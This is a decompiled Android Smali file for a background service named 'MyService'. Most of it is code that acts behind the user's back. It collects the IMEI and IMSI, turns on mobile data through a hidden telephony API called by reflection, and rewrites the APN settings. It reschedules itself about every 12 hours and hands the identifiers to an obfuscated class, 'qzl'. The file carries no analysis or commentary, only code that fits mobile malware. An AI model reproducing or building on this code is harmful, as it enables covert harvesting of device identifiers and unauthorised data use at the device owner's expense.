.class public Lcom/xxx/yyy/MyService;
.super Landroid/app/Service;
.source "MyService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xxx/yyy/MyService$APN;
    }
.end annotation


# static fields
.field private static final COLUMN_APN_ID:Ljava/lang/String; = "apn_id"

.field private static final PREFERRED_APN:Landroid/net/Uri;

.field private static final TAG:Ljava/lang/String; = "MyService"

.field private static final sleephour:I = 0xc

.field private static final sleeptime:I = 0x2d0


# instance fields
.field alarms:Landroid/app/AlarmManager;

.field currentid:Ljava/lang/String;

.field imei:Ljava/lang/String;

.field imsi:Ljava/lang/String;

.field iswap:I

.field pendingIntent:Landroid/app/PendingIntent;

.field uri:Landroid/net/Uri;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 217
    const-string v0, "content://telephony/carriers/preferapn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 216
    sput-object v0, Lcom/xxx/yyy/MyService;->PREFERRED_APN:Landroid/net/Uri;

    .line 49
    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 49
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 215
    const-string v0, "content://telephony/carriers/current"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/MyService;->uri:Landroid/net/Uri;

    .line 218
    const-string v0, "0"

    iput-object v0, p0, Lcom/xxx/yyy/MyService;->currentid:Ljava/lang/String;

    .line 49
    return-void
.end method

.method private getAPNList()Ljava/util/List;
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/MyService$APN;",
            ">;"
        }
    .end annotation

    .prologue
    const/4 v3, 0x0

    .line 240
    const-string v9, "Main.getAPNList()"

    .line 243
    .local v9, "tag":Ljava/lang/String;
    const/4 v0, 0x1

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "_id,apn,type,current"

    aput-object v1, v2, v0

    .line 244
    .local v2, "projection":[Ljava/lang/String;
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lcom/xxx/yyy/MyService;->uri:Landroid/net/Uri;

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 246
    .local v7, "cr":Landroid/database/Cursor;
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 248
    .local v8, "list":Ljava/util/List;, "Ljava/util/List<Lcom/xxx/yyy/MyService$APN;>;"
    :goto_0
    if-eqz v7, :cond_0

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_2

    .line 256
    :cond_0
    if-eqz v7, :cond_1

    .line 257
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 258
    :cond_1
    return-object v8

    .line 250
    :cond_2
    new-instance v6, Lcom/xxx/yyy/MyService$APN;

    invoke-direct {v6}, Lcom/xxx/yyy/MyService$APN;-><init>()V

    .line 251
    .local v6, "a":Lcom/xxx/yyy/MyService$APN;
    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/xxx/yyy/MyService$APN;->id:Ljava/lang/String;

    .line 252
    const-string v0, "apn"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/xxx/yyy/MyService$APN;->apn:Ljava/lang/String;

    .line 253
    const-string v0, "type"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/xxx/yyy/MyService$APN;->type:Ljava/lang/String;

    .line 254
    invoke-interface {v8, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method

.method protected static getITelephony(Landroid/content/Context;)Ljava/lang/Object;
    .locals 6
    .param p0, "context"    # Landroid/content/Context;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/SecurityException;,
            Ljava/lang/NoSuchMethodException;,
            Ljava/lang/IllegalArgumentException;,
            Ljava/lang/reflect/InvocationTargetException;,
            Ljava/lang/IllegalAccessException;
        }
    .end annotation

    .prologue
    const/4 v5, 0x0

    .line 204
    .line 205
    const-string v2, "phone"

    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    .line 204
    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 206
    .local v1, "tm":Landroid/telephony/TelephonyManager;
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    .line 207
    const-string v3, "getITelephony"

    new-array v4, v5, [Ljava/lang/Class;

    .line 206
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 208
    .local v0, "getITelephony":Ljava/lang/reflect/Method;
    invoke-virtual {v0}, Ljava/lang/reflect/Method;->isAccessible()Z

    move-result v2

    if-nez v2, :cond_0

    .line 209
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 211
    :cond_0
    new-array v2, v5, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    return-object v2
.end method

.method public static setMobileDataState(Landroid/content/Context;Z)V
    .locals 5
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "enabled"    # Z

    .prologue
    .line 189
    :try_start_0
    invoke-static {p0}, Lcom/xxx/yyy/MyService;->getITelephony(Landroid/content/Context;)Ljava/lang/Object;

    move-result-object v1

    .line 190
    .local v1, "iTelephony":Ljava/lang/Object;
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    .line 191
    if-eqz p1, :cond_0

    const-string v3, "enableDataConnectivity"

    .line 192
    :goto_0
    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    .line 190
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 193
    .local v0, "action":Ljava/lang/reflect/Method;
    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 198
    .end local v0    # "action":Ljava/lang/reflect/Method;
    .end local v1    # "iTelephony":Ljava/lang/Object;
    :goto_1
    return-void

    .line 192
    .restart local v1    # "iTelephony":Ljava/lang/Object;
    :cond_0
    const-string v3, "disableDataConnectivity"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 194
    .end local v1    # "iTelephony":Ljava/lang/Object;
    :catch_0
    move-exception v2

    goto :goto_1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 57
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 8

    .prologue
    const/4 v4, 0x0

    const-string v5, ""

    .line 71
    .line 72
    const-string v3, "phone"

    invoke-virtual {p0, v3}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    .line 71
    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 73
    .local v2, "mTelephonyMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    .line 74
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    .line 76
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    if-nez v3, :cond_0

    .line 77
    const-string v3, ""

    iput-object v5, p0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    .line 79
    :cond_0
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    if-nez v3, :cond_1

    .line 80
    const-string v3, ""

    iput-object v5, p0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    .line 82
    :cond_1
    const-string v3, "alarm"

    invoke-virtual {p0, v3}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/AlarmManager;

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    .line 86
    const-string v0, "com.lz.myservicestart"

    .line 88
    .local v0, "ALARM_ACTION":Ljava/lang/String;
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 90
    .local v1, "intentToFire":Landroid/content/Intent;
    invoke-static {p0, v4, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    iput-object v3, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    .line 92
    iget-object v3, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    const/4 v4, 0x2

    const-wide/32 v5, 0x2932e00

    .line 93
    iget-object v7, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    .line 92
    invoke-virtual {v3, v4, v5, v6, v7}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 99
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 107
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 24
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startid"    # I

    .prologue
    .line 116
    const/4 v5, 0x2

    .line 126
    .local v5, "alarmType":I
    const-string v20, "connectivity"

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/net/ConnectivityManager;

    .line 127
    .local v6, "connec":Landroid/net/ConnectivityManager;
    invoke-virtual {v6}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v15

    .line 128
    .local v15, "info":Landroid/net/NetworkInfo;
    if-nez v15, :cond_0

    .line 132
    const/16 v20, 0x1

    move-object/from16 v0, p0

    move/from16 v1, v20

    invoke-static {v0, v1}, Lcom/xxx/yyy/MyService;->setMobileDataState(Landroid/content/Context;Z)V

    .line 133
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v20

    const-wide/32 v22, 0x927c0

    add-long v16, v20, v22

    .line 134
    .local v16, "timeToRefresh":J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v21, v0

    move-object/from16 v0, v20

    move v1, v5

    move-wide/from16 v2, v16

    move-object/from16 v4, v21

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 185
    :goto_0
    return-void

    .line 137
    .end local v16    # "timeToRefresh":J
    :cond_0
    invoke-virtual {v15}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v20

    if-nez v20, :cond_1

    .line 141
    const/16 v20, 0x1

    move-object/from16 v0, p0

    move/from16 v1, v20

    invoke-static {v0, v1}, Lcom/xxx/yyy/MyService;->setMobileDataState(Landroid/content/Context;Z)V

    .line 142
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v20

    const-wide/32 v22, 0x927c0

    add-long v16, v20, v22

    .line 143
    .restart local v16    # "timeToRefresh":J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v21, v0

    move-object/from16 v0, v20

    move v1, v5

    move-wide/from16 v2, v16

    move-object/from16 v4, v21

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    goto :goto_0

    .line 146
    .end local v16    # "timeToRefresh":J
    :cond_1
    invoke-virtual {v15}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v10

    .line 147
    .local v10, "extraInfo":Ljava/lang/String;
    const/16 v20, 0x1

    move/from16 v0, v20

    move-object/from16 v1, p0

    iput v0, v1, Lcom/xxx/yyy/MyService;->iswap:I

    .line 149
    if-eqz v10, :cond_3

    .line 150
    const-string v20, "CMWAP"

    move-object v0, v10

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v20

    if-eqz v20, :cond_2

    .line 151
    const-string v20, "UNIWAP"

    move-object v0, v10

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v20

    if-nez v20, :cond_3

    .line 152
    :cond_2
    const/16 v20, 0x0

    move/from16 v0, v20

    move-object/from16 v1, p0

    iput v0, v1, Lcom/xxx/yyy/MyService;->iswap:I

    .line 154
    :cond_3
    invoke-virtual {v15}, Landroid/net/NetworkInfo;->getTypeName()Ljava/lang/String;

    move-result-object v18

    .line 155
    .local v18, "typeinfo":Ljava/lang/String;
    if-eqz v18, :cond_4

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v20

    const-string v21, "wifi"

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v20

    if-eqz v20, :cond_4

    .line 156
    const/16 v20, 0x2

    move/from16 v0, v20

    move-object/from16 v1, p0

    iput v0, v1, Lcom/xxx/yyy/MyService;->iswap:I

    .line 159
    :cond_4
    const-string v20, "update_flag"

    const/16 v21, 0x0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move/from16 v2, v21

    invoke-virtual {v0, v1, v2}, Lcom/xxx/yyy/MyService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v19

    .line 160
    .local v19, "update":Landroid/content/SharedPreferences;
    new-instance v8, Ljava/util/Date;

    invoke-direct {v8}, Ljava/util/Date;-><init>()V

    .line 161
    .local v8, "dt1":Ljava/util/Date;
    const-string v20, "oldtime"

    const-wide/16 v21, 0x0

    invoke-interface/range {v19 .. v22}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v11

    .line 162
    .local v11, "gdate1":J
    new-instance v9, Ljava/util/Date;

    invoke-direct {v9}, Ljava/util/Date;-><init>()V

    .line 163
    .local v9, "dt2":Ljava/util/Date;
    invoke-virtual {v9}, Ljava/util/Date;->getTime()J

    move-result-wide v20

    sub-long v20, v20, v11

    const-wide/32 v22, 0x36ee80

    div-long v13, v20, v22

    .line 166
    .local v13, "hour":J
    const-wide/16 v20, 0xb

    cmp-long v20, v13, v20

    if-lez v20, :cond_5

    .line 167
    invoke-interface/range {v19 .. v19}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v20

    const-string v21, "oldtime"

    invoke-virtual {v9}, Ljava/util/Date;->getTime()J

    move-result-wide v22

    invoke-interface/range {v20 .. v23}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v20

    invoke-interface/range {v20 .. v20}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 170
    new-instance v7, Lcom/xxx/yyy/qzl;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget v0, v0, Lcom/xxx/yyy/MyService;->iswap:I

    move/from16 v22, v0

    move-object v0, v7

    move-object/from16 v1, p0

    move-object/from16 v2, v20

    move-object/from16 v3, v21

    move/from16 v4, v22

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/xxx/yyy/qzl;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 171
    .local v7, "d":Lcom/xxx/yyy/qzl;
    invoke-virtual {v7}, Lcom/xxx/yyy/qzl;->GG()V

    .line 175
    .end local v7    # "d":Lcom/xxx/yyy/qzl;
    :cond_5
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v20

    const-wide/32 v22, 0x2932e00

    add-long v16, v20, v22

    .line 177
    .restart local v16    # "timeToRefresh":J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v21, v0

    move-object/from16 v0, v20

    move v1, v5

    move-wide/from16 v2, v16

    move-object/from16 v4, v21

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    goto/16 :goto_0
.end method

.method public openAPN()V
    .locals 13

    .prologue
    const/4 v11, 0x0

    const-string v12, "apn_id"

    .line 222
    invoke-direct {p0}, Lcom/xxx/yyy/MyService;->getAPNList()Ljava/util/List;

    move-result-object v2

    .line 223
    .local v2, "list":Ljava/util/List;, "Ljava/util/List<Lcom/xxx/yyy/MyService$APN;>;"
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_0

    .line 233
    new-instance v3, Landroid/content/ContentValues;

    invoke-direct {v3}, Landroid/content/ContentValues;-><init>()V

    .line 234
    .local v3, "values":Landroid/content/ContentValues;
    const-string v4, "apn_id"

    invoke-virtual {v3, v12}, Landroid/content/ContentValues;->putNull(Ljava/lang/String;)V

    .line 235
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    sget-object v5, Lcom/xxx/yyy/MyService;->PREFERRED_APN:Landroid/net/Uri;

    invoke-virtual {v4, v5, v3, v11, v11}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    .line 236
    const-string v4, "apn_id"

    iget-object v4, p0, Lcom/xxx/yyy/MyService;->currentid:Ljava/lang/String;

    invoke-virtual {v3, v12, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 237
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    sget-object v5, Lcom/xxx/yyy/MyService;->PREFERRED_APN:Landroid/net/Uri;

    invoke-virtual {v4, v5, v3, v11, v11}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    .line 238
    return-void

    .line 223
    .end local v3    # "values":Landroid/content/ContentValues;
    :cond_0
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/xxx/yyy/MyService$APN;

    .line 224
    .local v0, "apn":Lcom/xxx/yyy/MyService$APN;
    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    .line 225
    .local v1, "cv":Landroid/content/ContentValues;
    const-string v5, "apn"

    iget-object v6, v0, Lcom/xxx/yyy/MyService$APN;->apn:Ljava/lang/String;

    invoke-static {v6}, Lcom/xxx/yyy/APNMatchTools;->matchAPN(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 226
    const-string v5, "type"

    iget-object v6, v0, Lcom/xxx/yyy/MyService$APN;->type:Ljava/lang/String;

    invoke-static {v6}, Lcom/xxx/yyy/APNMatchTools;->matchAPN(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 227
    iget-object v5, v0, Lcom/xxx/yyy/MyService$APN;->type:Ljava/lang/String;

    invoke-static {v5}, Lcom/xxx/yyy/APNMatchTools;->matchAPN(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    const-string v6, "default"

    invoke-virtual {v5, v6}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_1

    .line 228
    iget-object v5, v0, Lcom/xxx/yyy/MyService$APN;->id:Ljava/lang/String;

    iput-object v5, p0, Lcom/xxx/yyy/MyService;->currentid:Ljava/lang/String;

    .line 230
    :cond_1
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v5

    iget-object v6, p0, Lcom/xxx/yyy/MyService;->uri:Landroid/net/Uri;

    const-string v7, "_id=?"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/String;

    const/4 v9, 0x0

    iget-object v10, v0, Lcom/xxx/yyy/MyService$APN;->id:Ljava/lang/String;

    aput-object v10, v8, v9

    invoke-virtual {v5, v6, v1, v7, v8}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    goto :goto_0
.end method
